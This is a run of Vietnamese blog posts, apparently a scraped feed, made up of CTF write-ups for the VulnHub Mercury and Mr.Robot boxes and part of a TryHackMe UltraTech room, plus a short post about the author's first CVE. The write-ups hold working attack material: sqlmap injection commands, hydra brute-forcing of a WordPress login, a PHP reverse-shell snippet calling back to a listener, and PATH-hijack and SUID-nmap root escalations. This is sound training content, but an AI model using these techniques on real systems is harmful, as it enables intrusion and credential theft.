place+ 7852 requests: 0 error(s) and 2 item(s) reported on remote host+ End Time:           2020-12-26 22:00:59 (GMT7) (61 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\nKhấm khá hơn đấy, tìm thấy thư mục &#x2F;SilverStream, đếch cần biết nó nghĩa là gì, truy cập vào xem sao đã.Ờ hớ, thư mục không tồn tại, trả về lỗi 404, nhưng do chế độ debug của web site được bật nên tôi thấy được một thư mục có tên là &#x2F;mercuryfacts. Mặt mũi của nó như thế này.Và khi nhấn vào để xem Mercury Fact thì nhận được vỏn vẹn dòng Fact id: 1. ((‘Mercury does not have any moons or rings.’,),). Ngắm nghía cái xem nào, cái này lấy fact theo id (url: http://10.10.10.10:8080/mercuryfacts/1/), vậy thì kiểm tra sql injection xem sao.Á đù, vẫn là chế độ debug, và nó đem lại quá nhiều thông tin ngon bổ rẻ ở đây, tôi biết được url này có lỗi sql injection, biết được câu truy vấn, hệ quản trị là mysql, và cả lú thông tin cấu hình http server bên dưới nữa. Ok, ném cái url này vào sqlmap và lấy toàn bộ cơ sở dữ liệu ra xem.\nSqlmap$ sqlmap --level=5 --risk=3 --threads=10 -u &quot;http://10.10.10.10:8080/mercuryfacts/1*/&quot; --dbms=mysql...[INFO] fetching database namesavailable databases [2]:[*] information_schema[*] mercury...[INFO] fetching tables for database: &#x27;mercury&#x27;Database: mercury[2 tables]+-------+| facts || users |+-------+...[INFO] fetching entries for table &#x27;users&#x27; in database &#x27;mercury&#x27;Database: mercuryTable: users[4 entries]+----+-------------------------------+-----------+| id | password                      | username  |+----+-------------------------------+-----------+| 1  | johnny1987                    | john      || 2  | lovemykids111                 | laura     || 3  | lovemybeer111                 | sam       || 4  | mercuryisthesizeof0.056Earths | webmaster |+----+-------------------------------+-----------+\nToẹt vời, mật khẩu lưu trong database nhưng không được mã hóa. Đoán là mấy cái tài khoản này được dùng để đăng nhập vào SSH, chứ cái web tò te này thì làm éo có trang login nào. Zô!(Sau vài lần login sai, cuối cùng thì chỉ có mỗi cái tài khoản webmaster là dùng được thôi, còn lại là trap hết)\nGet User Flag$ ssh webmaster@10.10.10.10                                                                      webmaster@10.10.10.10&#x27;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun 27 Dec 11:16:51 UTC 2020  System load:  0.15              Processes:               101  Usage of /:   68.0% of 4.86GB   Users logged in:         0  Memory usage: 57%               IPv4 address for enp0s3: 10.10.10.10  Swap usage:   0%22 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Sep  1 13:57:14 2020 from 192.168.31.136webmaster@mercury:~$ iduid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)webmaster@mercury:~$ ls -altotal 36drwx------ 4 webmaster webmaster 4096 Sep  2 13:04 .drwxr-xr-x 5 root      root      4096 Aug 28 11:33 ..lrwxrwxrwx 1 webmaster webmaster    9 Sep  1 10:01 .bash_history -&gt; /dev/null-rw-r--r-- 1 webmaster webmaster  220 Aug 27 13:13 .bash_logout-rw-r--r-- 1 webmaster webmaster 3771 Aug 27 13:13 .bashrcdrwx------ 2 webmaster webmaster 4096 Aug 27 14:19 .cachedrwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 mercury_proj-rw-r--r-- 1 webmaster webmaster  807 Aug 27 13:13 .profile-rw-rw-r-- 1 webmaster webmaster   75 Sep  1 11:01 .selected_editor-rw------- 1 webmaster webmaster   45 Sep  1 10:09 user_flag.txtwebmaster@mercury:~$ cat user_flag.txt [user_flag_8339915c9a454657bd60ee58776f4ccd]\nFlag đầu tiên, [user_flag_8339915c9a454657bd60ee58776f4ccd].\nPrivileges EscalationLần mò vào cái thư mục mercury_proj, đây là thư mục chứa script python để chạy web server, và có 1 file notes.txt.\nwebmaster@mercury:~/mercury_proj$ ls -altotal 28drwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 .drwx------ 4 webmaster webmaster 4096 Sep  2 13:04 ..-rw-r--r-- 1 webmaster webmaster    0 Aug 27 13:56 db.sqlite3-rwxr-xr-x 1 webmaster webmaster  668 Aug 27 14:06 manage.pydrwxrwxr-x 6 webmaster webmaster 4096 Sep  1 10:34 mercury_factsdrwxrwxr-x 4 webmaster webmaster 4096 Aug 28 12:47 mercury_indexdrwxrwxr-x 3 webmaster webmaster 4096 Aug 28 10:36 mercury_proj-rw------- 1 webmaster webmaster  196 Aug 28 12:56 notes.txtwebmaster@mercury:~/mercury_proj$ cat notes.txt Project accounts (both restricted):webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMKlinuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==\nMã hóa đỉnh cao đấy, dùng hẳn base64, nhưng may là tôi có tài crack thiên bẩm nên chỉ mất 1 giây là có thể lấy được mật khẩu bản rõ.\n$ echo bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK | base64 -dmercuryisthesizeof0.056Earths$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -dmercurymeandiameteris4880km\nTóm được thêm một chú nữa, linuxmaster/mercurymeandiameteris4880km, SSH sang cái tài khoản này xem nào.\nlinuxmaster@mercury:~$ sudo -l[sudo] password for linuxmaster: Sorry, try again.[sudo] password for linuxmaster: Matching Defaults entries for linuxmaster on mercury:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser linuxmaster may run the following commands on mercury:    (root : root) SETENV: /usr/bin/check_syslog.shlinuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh#!/bin/bashtail -n 10 /var/log/syslog\nGet Root FlagUser linuxmaster có thể chạy &#x2F;usr&#x2F;bin&#x2F;check_syslog.sh với sudo, với quyền root. Nội dung bash script dùng tail để kiểm tra log hệ thống, có thể nghĩ sang cách theo thang đặc quyền sử dụng PATH variables.Theo hướng này, đầu tiên là tạo một file có tên là tail, nội dung là /bin/bash, mục đích là khi chạy lệnh sudo /usr/bin/check_syslog.sh với PATH trỏ đến đường dẫn chứa file tail, hệ thống sẽ gọi tail từ PATH mà chúng ta cung cấp, khi đó file tail sẽ được thực thi với quyền root và khởi động shell, vậy là chúng ta sẽ có root shell.\nlinuxmaster@mercury:~$ mkdir dumalinuxmaster@mercury:~$ cd dumalinuxmaster@mercury:~/duma$ echo &quot;/bin/bash&quot; &gt; taillinuxmaster@mercury:~/duma$ chmod +x tail linuxmaster@mercury:~/duma$ ls -altotal 12drwxrwxr-x 2 linuxmaster linuxmaster 4096 Dec 27 12:39 .drwx------ 4 linuxmaster linuxmaster 4096 Dec 27 12:39 ..-rwxrwxr-x 1 linuxmaster linuxmaster   10 Dec 27 12:39 taillinuxmaster@mercury:~/duma$ export PATH=$(pwd):$PATHlinuxmaster@mercury:~/duma$ echo $PATH/home/linuxmaster/duma:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gameslinuxmaster@mercury:~/duma$ sudo -E PATH=$PATH /usr/bin/check_syslog.shroot@mercury:~/duma#uid=0(root) gid=0(root) groups=0(root)\nYay! Vậy là tóm được root shell, giờ thì lấy flag là xong thôi.\nroot@mercury:~# cd /rootroot@mercury:/root# lsroot_flag.txtroot@mercury:/root# cat root_flag.txt @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Congratulations on completing Mercury!!!If you have any feedback please contact me at SirFlash@protonmail.com[root_flag_69426d9fda579afbffd9c2d47ca31d90]\nTèn ten!Kinh nghiệm bản thân mình rút ra được từ bài này, đó là đừng tìn vào Response status, như ở trên, khi mình dùng dirsearch, nó chả tìm được thư mục nào cả, lí do là vì nó kiểm tra Response status và mặc định sẽ bỏ qua những file&#x2F;folder 404 (Not found). Vậy nên, hãy cứ nhập linh tinh vào cái url xem nó trả về cho mình cái gì, kể cả lỗi cũng được, nhỡ đâu lại vớ được debug thì sao &#x3D;))\nGood luck!\nFurther readingLeo thao đặc quyền sử dụng PATH variables\n","categories":["VulnHub"],"tags":["vulnhub","write up","easy"]},{"title":"[VulnHub] Mr.Robot","url":"/2021/02/03/mrrobot-vulnhub/","content":"\nOverviewLink download: MR-ROBOT: 1Difficulty: Chả biết, nhưng chắc là dễ…\n\nInformation GatheringNmapLại là mấy cái lệnh cửa miệng với mấy bài boot2root trên Vulnhub… bla bla bla…\n$ nmap -sn 10.10.10.101-105       Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:25 +07Nmap scan report for 10.10.10.101 (10.10.10.101)Host is up (0.00011s latency).Nmap scan report for 10.10.10.102Host is up (0.00045s latency).Nmap done: 5 IP addresses (2 hosts up) scanned in 1.26 seconds$ nmap -p- 10.10.10.102 --min-rate 3000Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:26 +07Nmap scan report for 10.10.10.102 (10.10.10.102)Host is up (0.00020s latency).Not shown: 65532 filtered portsPORT    STATE  SERVICE22/tcp  closed ssh80/tcp  open   http443/tcp open   httpsNmap done: 1 IP address (1 host up) scanned in 43.87 seconds$ nmap -p 22,80,443 -sC -sV 10.10.10.102Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 10:28 +07Nmap scan report for 10.10.10.102 (10.10.10.102)Host is up (0.00060s latency).PORT    STATE  SERVICE  VERSION22/tcp  closed ssh80/tcp  open   http     Apache httpd|_http-server-header: Apache|_http-title: Site doesn&#x27;t have a title (text/html).443/tcp open   ssl/http Apache httpd|_http-server-header: Apache|_http-title: Site doesn&#x27;t have a title (text/html).| ssl-cert: Subject: commonName=www.example.com| Not valid before: 2015-09-16T10:45:03|_Not valid after:  2025-09-13T10:45:03Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds\nVậy là bài này đang mở 3 cổng TCP là 22, 80, và 443. Mô hình chung là sẽ đánh vào một lỗi nào đó trên web server cổng 80&#x2F;443 và cướp shell, leo quyền… chứ không lằng nhằng đến các service khác.Okay, Dirsearch nó xem nào.\nDirsearchKết quả dưới đây đã lọc hết các response có status khác 200, cho dễ nhìn. Nếu vẫn còn khó nhìn, thì tôi khuyên bạn nên dành mấy phút nghỉ ngơi xem pỏn giải trí đi.\n[10:29:58] Starting: cookies.js[10:31:08] 200 -    1KB - /admin/[10:31:08] 200 -    1KB - /admin/?/login[10:31:10] 200 -    1KB - /admin/index[10:31:10] 200 -    1KB - /admin/index.html[10:32:26] 200 -    0B  - /favicon.ico[10:32:38] 200 -    1KB - /index.html[10:32:41] 200 -  504KB - /intro[10:32:47] 200 -  309B  - /license[10:32:47] 200 -  309B  - /license.txt[10:33:27] 200 -   64B  - /readme[10:33:27] 200 -   64B  - /readme.html[10:33:30] 200 -   41B  - /robots.txt[10:33:40] 200 -    0B  - /sitemap[10:33:40] 200 -    0B  - /sitemap.xml[10:33:40] 200 -    0B  - /sitemap.xml.gzhttp://10.10.10.102/sugarcrm/?module=Accounts&amp;action=ShowDuplicateshttp://10.10.10.102/sugarcrm/?module=Contacts&amp;action=ShowDuplicates%20[10:34:07] 200 -    1B  - /wp-admin/admin-ajax.php[10:34:07] 500 -    3KB - /wp-admin/setup-config.php[10:34:07] 200 -    0B  - /wp-config.php[10:34:07] 200 -    0B  - /wp-content/[10:34:08] 500 -    0B  - /wp-content/plugins/hello.php[10:34:08] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php[10:34:08] 200 -    0B  - /wp-cron.php[10:34:08] 200 -    3KB - /wp-login.php[10:34:08] 200 -    3KB - /wp-login[10:34:08] 200 -    3KB - /wp-login/\nCó thể thấy ngay web server này sử dụng nền tảng Wordpress để xây dựng nội dung.Kệ bà nó cái đã, vòng qua một vòng cái đống này xem nào.Có cái này hay ho…http://10.10.10.102/robots.txt\nUser-agent: *fsocity.dickey-1-of-3.txt\nhttp://10.10.10.102/key-1-of-3.txt\n073403c8a58a1f80d943455fb30724b9\nĐây là một flag mà đề bài yêu cầu tìm, không liên quan gì đến việc khai thác lỗi của bài.Và một file nữa (http://10.10.10.102/fsocity.dic), nhìn là biết đây là một wordlist, tác giả đang muốn chúng ta sử dụng nó để tấn công brute-force ở một phần nào đó trong bài.Đúng rồi đấy :D chỉ còn ở đây chứ còn ở đâu nữa. Thật ra vẫn còn chỗ nữa để brute-force đấy là cổng 22-SSH, cơ mà nếu brute-force thành công và lấy được SSH shell thì bài này quá ez, chả cần phải lần mò và web server để đào bới vấn đề.Theo cái lối suy nghĩ cổ hủ và bảo thủ ấy, tôi quyết định brute-force trang login của Wordpress.Đầu tiên là mò username. Wordpress có một cái sự ngớ ngẩn khi thông báo Login không thành công. Khi login với username không tồn tại trong hệ thống, nó sẽ trổ luôn ra một câu Invalid user!. Dafuk? Và nếu username có tồn tại trong hệ thống, nhưng sai password, lúc này sẽ là một thông báo khác là Incorrect password.Đây vừa có thể là một lỗi, vừa có thể là một tính năng. Cơ mà bây giờ để bảo mật, các trang login thường sẽ để một thông báo chung chung ví dụ như “Username hoặc password mày vừa nhập có vấn đề” hoặc ngắn gọn hơn là “Đăng nhập éo thành công!”. Còn như thằng Wordpress này ấy, cái lỗi ở đây khiến cho kẻ tấn công có thể dò tìm được username, và sau đó sẽ dò tiếp password tương ứng với username, sẽ đỡ thời gian brute-force hơn rất nhiều so với việc dò tìm cả 2 cái này cùng một lúc.Trình bày dài dòng là như thế, giờ thì dò username thôi :))Ném cái wordlist vừa tìm được vào option -L (List user) và option -p là duma (Mật khẩu tự chọn).\n$ hydra -L fsocity.dic -p duma 10.10.10.102 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid&quot;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 10:49:37[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task[DATA] attacking http-post-form://10.10.10.102:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid[80][http-post-form] host: 10.10.10.102   login: Elliot   password: duma[80][http-post-form] host: 10.10.10.102   login: elliot   password: duma[STATUS] 2090.00 tries/min, 2090 tries in 00:01h, 856145 to do in 06:50h, 16 active\nThế là tóm được thằng user Elloit&#x2F;elliot, do không phân biệt chữ hoa và chữ thường.Tiếp theo là dò mật khẩu của thằng Elliot, lần này đợi hơi lâu nên tôi quyết định treo máy đấy và đi chơi game.\n$ hydra -l elliot -P fsocity.dic 10.10.10.102 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid&quot;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-03 10:52:31[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task[DATA] attacking http-post-form://10.10.10.102:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Incorrect[80][http-post-form] host: 10.10.10.102   login: elliot   password: ER28-0652\nNghe ổn đấy, login vào xem nào.Để ý thấy Elliot đang là admin của trang này, toẹt vời, điều đó có nghĩa là Elliot có thể sửa đổi mã nguồn của các page như 404, header, poster các thứ… Không cần đến Wpscan để quét, chèn một đoạn shell PHP vào bất kỳ page nào trong phần Editer, miễn là truy cập được là được.\n$sock = fsockopen(&quot;10.10.10.101&quot;,4444);$proc = proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);\nMở listen netcat trên port 4444 và lấy shell :))\n$ nc -klnvp 4444                        Ncat: Version 7.91 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.102.Ncat: Connection from 10.10.10.102:35666./bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=1(daemon) gid=1(daemon) groups=1(daemon)$ ls -altotal 16drwxr-xr-x 2 root  root  4096 Nov 13  2015 .drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5$ cat password.raw-md5robot:c3fcd3d76192e4007dfb496cca67e13b\nÈn. Họ cho luôn mật khẩu hash của user robot này.robot:abcdefghijklmnopqrstuvwxyz\nPrivileges EscalationLấy PTY rồi chuyển sang phiên của user robot.\nrobot@linux:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsesshd:x:102:65534::/var/run/sshd:/usr/sbin/nologinftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/falsebitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_falsemysql:x:1001:1001::/home/mysql:varnish:x:999:999::/home/varnish:robot:x:1002:1002::/home/robot:\nNothing to do here. Tìm kiếm binary SUID xem sao.\nrobot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/bin/ping/bin/umount/bin/mount/bin/ping6/bin/su/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/local/bin/nmap/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/usr/lib/pt_chown\nOay, có nmap kìa. Dễ rồi. (https://gtfobins.github.io/gtfobins/nmap/)\nrobot@linux:~$ ls -al /usr/local/bin/nmap-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmaprobot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!sh# iduid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)\nSUID cho phép người dùng khác có thể chạy file với quyền của owner, trong trường hợp này là root.Tại sao lại dùng !sh thay vì dùng !bash?Lần đầu tôi cũng dùng !bash, kiểm tra thì thấy vẫn là user robot. Vậy là tôi bị mất thời gian để đi tìm kiếm những cách khác để leo root. Cơ mà sau một hồi google và để ý lại doc trên trang gtfobins, thấy cái này.\n\nSUIDIf the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;&#x3D; Stretch) that allow the default sh shell to run with SUID privileges.This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\nĐuỵt moẹ! lại là câu chuyện của sh và bash và dash, xem ra Linux vẫn còn rất nhiều thứ cơ bản mà tôi cứ nghĩ là mình biết rồi…\n","categories":["VulnHub"],"tags":["vulnhub","write up","medium"]},{"title":"[Talk] Câu chuyện về CVE đầu tiên.","url":"/2022/04/04/story-about-my-first-cve/","content":"Một chiếc CVE chẳng ai quan tâm trên một nền tảng CMS cũng chẳng ai quan tâm, ít ra thì cũng được công nhận.\n\nTôi mất không nhiều thời gian để tìm ra lỗ hổng này, một lỗi về việc xử lý quá trình tải lên và lưu trữ tập tin, nó ở mức cơ bản, chẳng có gì sáng tạo. Cuối cùng thì viết ra cách thức khai thác, vì quy định để được cấp CVE là phải có xuất bản công khai trước.Ờ hờ, tôi để đường dẫn bài viết ở đây nhé, vào đọc ủng hộ!https://minhnq22.medium.com/file-upload-to-rce-on-zenario-9-0-54156-cms-fa05fcc6cf74Sau những 6 tháng, tôi không hề nhận được email nào báo rằng lỗ hổng mình tìm được đã được cấp mã CVE, hơi chán, vì đây là lần đầu tôi làm cái trò này. Nghĩ là xịt, cho đến một hôm Twitter của Mitre đăng bài về CVE mới được cấp cho một lỗ hổng trên nền tảng CMS Zerario với mã CVE-2021-42171, phiên bản 9.0.54156, y hệt phiên bản tôi đã khai thác. Ơ kìa ?? :D ??Tôi mò vào đọc PoC theo đường dẫn, cười, cái cách thức khai thác y hệt cách của tôi, trong khi issue này được tạo vào ngày 05&#x2F;10&#x2F;2021, tức là sau bài viết của tôi 7 ngày (28&#x2F;09&#x2F;2021). Tôi hoàn toàn không có ý gì tác giả của issue, vì thế giới có những 8 tỷ người, và tôi lại chẳng nổi tiếng để bài viết kia có được vài người đọc. Nhưng vẫn cay! Thậm chí mã khai thác của tôi cũng được đẩy lên Github lần đầu vào ngày 30&#x2F;09&#x2F;2021.Tôi mới email lại cho Mitre, cái tổ chức cấp mã CVE, “Ê, các ông bỏ lỡ mất cái request của tôi rồi.”Sau đó thì…\n","categories":["Talk"],"tags":["talk","cve","cve-2021-42171"]},{"title":"[TryHackMe] UltraTech1","url":"/2021/01/25/ultratech1-tryhackme/","content":"\nOverviewLink: https://tryhackme.com/room/ultratech1Difficulty: Medium (Nhưng thực ra khá dễ)Mở ra Task 1 có phầm mở đầu khá dài, anh em thích đọc thì đọc, còn không thì nhấn vào cái nút Deploy màu xanh kia mà bắt đầu cho đỡ mất thời gian.\n\nTryHackMe mỗi lần Deploy sẽ ra một địa chỉ IP Lab khác nhau, nếu cảm thấy may mắn có thể đem mấy con số đó đi đánh đề.Lần này con số may mắn của tôi là 10.10.3.122, tiếc cái lúc này đã quá 18h30 nên không còn tiết mục quay số xanh đỏ nữa, hmm…\nInformation GatheringNmap$ nmap -A -v 10.10.3.122 PORT     STATE SERVICE VERSION21/tcp   open  ftp     vsftpd 3.0.322/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)8081/tcp open  http    Node.js Express framework|_http-cors: HEAD GET POST PUT DELETE PATCH| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\nTrước mắt là vớ được 3 cổng 21-FTP, 22-SSH và 8081-HTTP, theo sau là phiên bản của từng dịch vụ chạy trên các cổng đó.Tất nhiên nếu dùng option -A của nmap thì chỉ mới phát hiện được các cổng tiêu biểu, chứ chưa thể liệt kê được tất cả các cổng đang được mở public trên server.Để ý trong câu hỏi thuộc Task 2, có câu Which other non-standard port is used? và câu trả lời bên dưới có dạng *****, nghĩa là cổng này có 5 chữ số, trong khoảng từ 10000-65535, việc cần làm là phải tìm ra nó cái đã. Lại Nmap thôi :D\n$ nmap -p 10000-65535 -T5 10.10.3.122PORT      STATE    SERVICE...31070/tcp filtered unknown31146/tcp filtered unknown31331/tcp open     unknown31396/tcp filtered unknown31610/tcp filtered unknown31777/tcp filtered unknown...\nLúc chờ script này hoàn thành, tôi đã xem được hết trận Navi với Astralis.Tóm được cổng 31331 đang mở, trốn kỹ đấy tml. Giờ thì xem xem thế lực nào đứng đằng sau nó.\n$ nmap -p 31331 -sC -sV 10.10.3.122  PORT      STATE SERVICE VERSION31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)\nApache! Server này đang chạy 2 cổng HTTP, méo biết để làm gì. Mở cả 2 cái web của nó lên xem thế nào đã.\nDirsearchChạy dirsearch với cổng 8081.\n$ ./dirsearch.py -e php,txt,html -u http://10.10.3.122:8081/[22:03:13] Starting: [22:03:53] 200 -   39B  - /auth[22:03:53] 200 -   39B  - /auth/[22:04:26] 500 -    1KB - /pingTask Completed\nTruy cập vào &#x2F;auth&#x2F;, có thông báo You must specify a login and a password, có thể hình dung đây là một API, và cổng 8081 được dùng để chạy cung cấp API cho web server cổng 31331.Thử thêm param vào cho API &#x2F;auth (http://10.10.3.122:8081/auth/?login=admin&amp;password=admin), nhận lại vỏn vẹn dòng Invalid credentials. Okay :(Còn với ping thì sao (http://10.10.3.122:8081/ping)\nTypeError: Cannot read property &#x27;replace&#x27; of undefined    at app.get (/home/www/api/index.js:45:29)    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)    at /home/www/api/node_modules/express/lib/router/index.js:281:22    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)    at /home/www/api/node_modules/cors/lib/index.js:224:17\nLỗi trả về cho thấy API đang yêu cầu param, nhưng đéo ai biết param nó đang cần là gì. Với hình dung là việc API này cung cấp dịch vụ Ping, tôi nghĩ đến việc có thể lợi dụng nó để chèn lệnh (Command Injection) và lấy shell. Mường tượng ra là như thế, giờ phải đi tìm cách để sử dụng cái API Ping này cái đã.Quay lại với web server trên cổng 31331, khá chắc kèo là ở đây sẽ có đoạn code nào đó để gọi các API mà phía cổng 8081 cung cấp, từ đây có thể xác định được param cần thiết cho API là gì.Chạy dirsearch trên cổng 31331.\n./dirsearch.py -e php,txt,html -u http://10.10.3.122:31331/[22:14:10] 301 -  317B  - /css  -&gt;  http://10.10.3.122:31331/css/[22:14:16] 200 -   15KB - /favicon.ico[22:14:19] 301 -  320B  - /images  -&gt;  http://10.10.3.122:31331/images/[22:14:19] 200 -    4KB - /images/[22:14:20] 200 -    6KB - /index.html[22:14:21] 301 -  324B  - /javascript  -&gt;  http://10.10.3.122:31331/javascript/[22:14:22] 301 -  316B  - /js  -&gt;  http://10.10.3.122:31331/js/[22:14:22] 200 -    1KB - /js/[22:14:39] 200 -   53B  - /robots.txt[22:14:40] 403 -  302B  - /server-status[22:14:40] 403 -  303B  - /server-status/Task Completed\nTìm kiếm trong các thư mục có status 200. Các thư mục như &#x2F;css&#x2F;, &#x2F;images&#x2F;, &#x2F;javascript&#x2F;, &#x2F;js&#x2F; thì thường tôi hay bị bỏ qua. Hoặc có vào thì cũng chỉ xem lướt lướt. Cơ mà lần này do đéo biết mò mẫm ở đâu để kiếm thêm thông tin nữa, nên tôi mở chúng lên xem.Có một điều lạ, là &#x2F;javascript&#x2F; và 